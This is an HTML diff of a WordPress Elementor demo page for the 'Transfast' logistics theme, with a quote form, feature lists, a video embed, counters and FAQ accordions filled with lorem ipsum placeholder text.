+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-truck"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						DELIVERY IN TIME					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-3ebd48b elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="3ebd48b" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-map-marker-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						LARGE DESTINATIONS					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-2446e3c elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="2446e3c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-9d884b1" data-id="9d884b1" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-4856c7e elementor-widget elementor-widget-heading" data-id="4856c7e" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">no content</h2>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3d2ae7d quick_quota_style" data-id="3d2ae7d" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2ef254b elementor-widget elementor-widget-heading" data-id="2ef254b" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">REQUEST A
+</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-c8b65fb elementor-widget elementor-widget-heading" data-id="c8b65fb" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">QUICK QUOTE</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-ae7d1c9 elementor-widget elementor-widget-text-editor" data-id="ae7d1c9" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Transfast is the best theme elit, sed do eiusmod tempor dolor sit amet, conse ctetur adscing elit, sed do eiusmod tempor incididunt ut labore et lorna aliquatd</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-51b3086 elementor-widget elementor-widget-htmega-wpforms-addons" data-id="51b3086" data-element_type="widget" data-widget_type="htmega-wpforms-addons.default">
+				<div class="elementor-widget-container">
+			<div class="wpforms-container wpforms-container-full" id="wpforms-241"><form id="wpforms-form-241" class="wpforms-validate wpforms-form" data-formid="241" method="post" enctype="multipart/form-data" action="http://demo.shrimpthemes.com/3/transfastem/" data-token="c239e9a02aa1ddf875407bd01f25f5e1"><noscript class="wpforms-error-noscript">Please enable JavaScript in your browser to complete this form.</noscript><div class="wpforms-field-container"><div id="wpforms-241-field_0-container" class="wpforms-field wpforms-field-name wpforms-one-half wpforms-first" data-field-id="0"><label class="wpforms-field-label wpforms-label-hide" for="wpforms-241-field_0">Name <span class="wpforms-required-label">*</span></label><input type="text" id="wpforms-241-field_0" class="wpforms-field-large wpforms-field-required" name="wpforms[fields][0]" placeholder="Name" required></div><div id="wpforms-241-field_1-container" class="wpforms-field wpforms-field-email wpforms-one-half" data-field-id="1"><label class="wpforms-field-label wpforms-label-hide" for="wpforms-241-field_1">Email <span class="wpforms-required-label">*</span></label><input type="email" id="wpforms-241-field_1" class="wpforms-field-large wpforms-field-required" name="wpforms[fields][1]" placeholder="Email" required></div><div id="wpforms-241-field_3-container" class="wpforms-field wpforms-field-name wpforms-one-half wpforms-first" data-field-id="3"><label class="wpforms-field-label wpforms-label-hide" for="wpforms-241-field_3">Subject <span class="wpforms-required-label">*</span></label><input type="text" id="wpforms-241-field_3" class="wpforms-field-large wpforms-field-required" name="wpforms[fields][3]" placeholder="Subject" required></div><div id="wpforms-241-field_4-container" class="wpforms-field wpforms-field-name wpforms-one-half" data-field-id="4"><label class="wpforms-field-label wpforms-label-hide" for="wpforms-241-field_4">Subject (copy) <span class="wpforms-required-label">*</span></label><input type="text" id="wpforms-241-field_4" class="wpforms-field-large wpforms-field-required" name="wpforms[fields][4]" placeholder="Transport" required></div><div id="wpforms-241-field_2-container" class="wpforms-field wpforms-field-textarea" data-field-id="2"><label class="wpforms-field-label wpforms-label-hide" for="wpforms-241-field_2">Comment or Message <span class="wpforms-required-label">*</span></label><textarea id="wpforms-241-field_2" class="wpforms-field-medium wpforms-field-required" name="wpforms[fields][2]" placeholder="Message" required></textarea></div></div><div class="wpforms-field wpforms-field-hp"><label for="wpforms-241-field-hp" class="wpforms-field-label">Message</label><input type="text" name="wpforms[hp]" id="wpforms-241-field-hp" class="wpforms-field-medium"></div><div class="wpforms-submit-container"><input type="hidden" name="wpforms[id]" value="241"><input type="hidden" name="wpforms[author]" value="1"><input type="hidden" name="wpforms[post_id]" value="6"><button type="submit" name="wpforms[submit]" id="wpforms-submit-241" class="wpforms-submit" data-alt-text="Sending..." data-submit-text="Submit Now" aria-live="assertive" value="wpforms-submit">Submit Now</button></div></form></div>  <!-- .wpforms-container -->		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-f81e8f1 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="f81e8f1" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-dc9a707" data-id="dc9a707" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-6583a68 elementor-widget elementor-widget-heading" data-id="6583a68" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">OUR</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-9213efc elementor-widget elementor-widget-heading" data-id="9213efc" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">FEATURES
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-35213e4 elementor-widget elementor-widget-text-editor" data-id="35213e4" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Transfast is the best theme elit, sed do eiusmod tempor dolor sit amet, conse ctetur adscing elit, sed do eiusmod tempor incididunt ut ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod por</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-060b434 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="060b434" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text"><b>Wareouse Support </b>sed do eiusmod tempor dolor sit et conse ctetur adscing elit, sed do eiusmod tempor</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text"><strong>Safe & Secure Delivery </strong>sed do eiusmod tempor dolor sit et conse ctetur adscing elit, sed do eiusmod tempor</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text"><strong>Fast & On Time </strong>sed do eiusmod tempor dolor sit et conse ctetur adscing elit, sed do eiusmod tempor</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text"><strong>Free Packing </strong>sed do eiusmod tempor dolor sit et conse ctetur adscing elit, sed do eiusmod tempor</span>
+									</li>
+						</ul>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-b340c2a" data-id="b340c2a" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7b6a755 elementor-widget elementor-widget-heading" data-id="7b6a755" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">WATCH THE VIDEO AND TAKE</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-7c2c5b6 elementor-widget elementor-widget-heading" data-id="7c2c5b6" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">SOME IDEA ABOUT OUR COMPANY
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-e0f183c elementor-widget elementor-widget-text-editor" data-id="e0f183c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Transfast is the best theme elit, sed do eiusmod tempor dolor sit amet, conse ctetur aing elit, sed do eiusmod tempor incididunt ut elit, sed do eiusmod tempor dolor sit</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-50d3472 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="50d3472" data-element_type="widget" data-settings="{&quot;youtube_url&quot;:&quot;https:\/\/www.youtube.com\/watch?v=XHOmBV4js_E&quot;,&quot;show_image_overlay&quot;:&quot;yes&quot;,&quot;image_overlay&quot;:{&quot;url&quot;:&quot;http:\/\/demo.shrimpthemes.com\/3\/transfastem\/wp-content\/uploads\/2019\/08\/video-play.jpg&quot;,&quot;id&quot;:418},&quot;lightbox&quot;:&quot;yes&quot;,&quot;video_type&quot;:&quot;youtube&quot;,&quot;controls&quot;:&quot;yes&quot;,&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-wrapper elementor-open-lightbox">
+							<div class="elementor-custom-embed-image-overlay" data-elementor-open-lightbox="yes" data-elementor-lightbox="{&quot;type&quot;:&quot;video&quot;,&quot;videoType&quot;:&quot;youtube&quot;,&quot;url&quot;:&quot;https:\/\/www.youtube.com\/embed\/XHOmBV4js_E?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0&quot;,&quot;modalOptions&quot;:{&quot;id&quot;:&quot;elementor-lightbox-50d3472&quot;,&quot;entranceAnimation&quot;:&quot;&quot;,&quot;entranceAnimation_tablet&quot;:&quot;&quot;,&quot;entranceAnimation_mobile&quot;:&quot;&quot;,&quot;videoAspectRatio&quot;:&quot;169&quot;}}">
+											<img width="616" height="352" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/video-play.jpg" class="attachment-full size-full" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/video-play.jpg 616w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/video-play-300x171.jpg 300w" sizes="(max-width: 616px) 100vw, 616px" />																<div class="elementor-custom-embed-play" role="button">
+							<i aria-hidden="true" class="eicon-play"></i>							<span class="elementor-screen-only">Play Video</span>
+						</div>
+									</div>
+					</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-d265f3e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d265f3e" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+		
+				<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-6f1f6ea" data-id="6f1f6ea" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7e70073 elementor-widget elementor-widget-heading" data-id="7e70073" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">SOME 
+</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-a52db16 elementor-widget elementor-widget-heading" data-id="a52db16" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">FUN FACTORS
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-81301ab elementor-widget elementor-widget-text-editor" data-id="81301ab" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Transfast is the best theme elit, sed do eiusmod tempor dolor sit amet, conse ctetur aing elit, sed do eiusmod tempor incididunt ut elit</p>					</div>
+						</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-a3dbe06 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="a3dbe06" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+							<div class="elementor-background-overlay"></div>
+							<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-9485a20" data-id="9485a20" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated" style="padding:20px;">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-b875d1c elementor-widget elementor-widget-htmega-counter-addons" data-id="b875d1c" data-element_type="widget" data-widget_type="htmega-counter-addons.default">
+				<div class="elementor-widget-container">
+			            <div class="htmega-counter-area htmega-counter-style-6 htmega-countericon-align-">
+                <div class="htmega-counter-icon"><img width="32" height="31" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/cap.png" class="attachment-large size-large" alt="" loading="lazy" /><span class="htmega-counter-number">450</span></div>                <div class="htmega-counter-content">
+                    <h2 class="htmega-counter-title">Cap of Coffee</h2>                </div>
+            </div>
+
+        		</div>
+				</div>
+				<div class="elementor-element elementor-element-602f8d6 elementor-widget elementor-widget-htmega-counter-addons" data-id="602f8d6" data-element_type="widget" data-widget_type="htmega-counter-addons.default">
+				<div class="elementor-widget-container">
+			            <div class="htmega-counter-area htmega-counter-style-6 htmega-countericon-align-">
+                <div class="htmega-counter-icon"><img width="31" height="32" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/home.png" class="attachment-large size-large" alt="" loading="lazy" /><span class="htmega-counter-number">105</span></div>                <div class="htmega-counter-content">
+                    <h2 class="htmega-counter-title">NO. Of Branchess</h2>                </div>
+            </div>
+
+        		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-b4ff57c" data-id="b4ff57c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-17452a6 elementor-widget elementor-widget-htmega-counter-addons" data-id="17452a6" data-element_type="widget" data-widget_type="htmega-counter-addons.default">
+				<div class="elementor-widget-container">
+			            <div class="htmega-counter-area htmega-counter-style-6 htmega-countericon-align-">
+                <div class="htmega-counter-icon"><img width="34" height="32" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/check.png" class="attachment-large size-large" alt="" loading="lazy" /><span class="htmega-counter-number">350</span></div>                <div class="htmega-counter-content">
+                    <h2 class="htmega-counter-title">Project Complete</h2>                </div>
+            </div>
+
+        		</div>
+				</div>
+				<div class="elementor-element elementor-element-13d1e2d elementor-widget elementor-widget-htmega-counter-addons" data-id="13d1e2d" data-element_type="widget" data-widget_type="htmega-counter-addons.default">
+				<div class="elementor-widget-container">
+			            <div class="htmega-counter-area htmega-counter-style-6 htmega-countericon-align-">
+                <div class="htmega-counter-icon"><img width="35" height="31" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/track.png" class="attachment-large size-large" alt="" loading="lazy" /><span class="htmega-counter-number">150</span></div>                <div class="htmega-counter-content">
+                    <h2 class="htmega-counter-title">No. Of Vehicles</h2>                </div>
+            </div>
+
+        		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-7ec4e6f elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="7ec4e6f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3c31201" data-id="3c31201" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-f203c76 elementor-widget elementor-widget-heading" data-id="f203c76" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">no content</h2>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-fc8fc6c quick_quota_style" data-id="fc8fc6c" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d4feb85 elementor-widget elementor-widget-heading" data-id="d4feb85" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">FREQUENTLY
+</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-3ca8902 elementor-widget elementor-widget-heading" data-id="3ca8902" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">ASK & QUESTIONS
+</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-99006ee elementor-widget elementor-widget-text-editor" data-id="99006ee" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Transfast is the best theme elit, sed do eiusmod tempor dolor sit amet, conse ctetur adscing elit, sed do eiusmod tempor incididunt ut labore et lorna aliquatd</p>					</div>
+						</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-73f967a elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="73f967a" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-d893e26" data-id="d893e26" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-206c2b1 elementor-widget elementor-widget-accordion" data-id="206c2b1" data-element_type="widget" data-widget_type="accordion.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-accordion" role="tablist">
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-3391" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-3391" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">How can we track our goods</a>
+					</div>
+					<div id="elementor-tab-content-3391" class="elementor-tab-content elementor-clearfix" data-tab="1" role="tabpanel" aria-labelledby="elementor-tab-title-3391"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-3392" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-3392" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">What is the pirce for transport</a>
+					</div>
+					<div id="elementor-tab-content-3392" class="elementor-tab-content elementor-clearfix" data-tab="2" role="tabpanel" aria-labelledby="elementor-tab-title-3392"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-3393" class="elementor-tab-title" data-tab="3" role="tab" aria-controls="elementor-tab-content-3393" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">Delivery time</a>
+					</div>
+					<div id="elementor-tab-content-3393" class="elementor-tab-content elementor-clearfix" data-tab="3" role="tabpanel" aria-labelledby="elementor-tab-title-3393"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-3394" class="elementor-tab-title" data-tab="4" role="tab" aria-controls="elementor-tab-content-3394" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">What about warehouse</a>
+					</div>
+					<div id="elementor-tab-content-3394" class="elementor-tab-content elementor-clearfix" data-tab="4" role="tabpanel" aria-labelledby="elementor-tab-title-3394"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+								</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-e3ed143" data-id="e3ed143" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d44b102 elementor-widget elementor-widget-accordion" data-id="d44b102" data-element_type="widget" data-widget_type="accordion.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-accordion" role="tablist">
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-2221" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-2221" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">Which vehicles you company uses</a>
+					</div>
+					<div id="elementor-tab-content-2221" class="elementor-tab-content elementor-clearfix" data-tab="1" role="tabpanel" aria-labelledby="elementor-tab-title-2221"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-2222" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-2222" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">Know about our branches</a>
+					</div>
+					<div id="elementor-tab-content-2222" class="elementor-tab-content elementor-clearfix" data-tab="2" role="tabpanel" aria-labelledby="elementor-tab-title-2222"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-2223" class="elementor-tab-title" data-tab="3" role="tab" aria-controls="elementor-tab-content-2223" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">Do you have home delivery system</a>
+					</div>
+					<div id="elementor-tab-content-2223" class="elementor-tab-content elementor-clearfix" data-tab="3" role="tabpanel" aria-labelledby="elementor-tab-title-2223"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+							<div class="elementor-accordion-item">
+					<div id="elementor-tab-title-2224" class="elementor-tab-title" data-tab="4" role="tab" aria-controls="elementor-tab-content-2224" aria-expanded="false">
+													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
+															<span class="elementor-accordion-icon-closed"><i class="fas fa-plus"></i></span>
+								<span class="elementor-accordion-icon-opened"><i class="fas fa-minus"></i></span>
+														</span>
+												<a class="elementor-accordion-title" href="#">What to do if we what to change the destination</a>
+					</div>
+					<div id="elementor-tab-content-2224" class="elementor-tab-content elementor-clearfix" data-tab="4" role="tabpanel" aria-labelledby="elementor-tab-title-2224"><p>Sed ut perspiciatis unde omnis iste natus error sit tatem accusantium doloremque laudantium tam rem riam, eaque ipsa quae ab illo invet</p></div>
+				</div>
+								</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				
+			
+						</div>
+						</div>
+					</div>
+		
+	</div><!-- #content -->
+
+	
+<footer class="footer-wrapper ">
+
+		<div data-elementor-type="wp-post" data-elementor-id="328" class="elementor elementor-328" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-4eef930 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4eef930" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-0db1995" data-id="0db1995" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-aac4ba1 elementor-widget elementor-widget-heading" data-id="aac4ba1" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">About Us</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-e697cad elementor-widget elementor-widget-text-editor" data-id="e697cad" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p>Lorem must explain to you how all this mistaolt cing pleasure and praising ain wasnad I will give you a complete pain was prexplain to you lorem</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-3c0b1b6 elementor-widget elementor-widget-htmega-mailchimp-wp-addons" data-id="3c0b1b6" data-element_type="widget" data-widget_type="htmega-mailchimp-wp-addons.default">
+				<div class="elementor-widget-container">
+			            <div class="htmega-mailchimp htmega-mailchimp-style-4" >
+                <div class="htmega-input-box">
+                    <script type="rocketlazyloadscript">(function() {
+	window.mc4wp = window.mc4wp || {
+		listeners: [],
+		forms: {
+			on: function(evt, cb) {
+				window.mc4wp.listeners.push(
+					{
+						event   : evt,
+						callback: cb
+					}
+				);
+			}
+		}
+	}
+})();
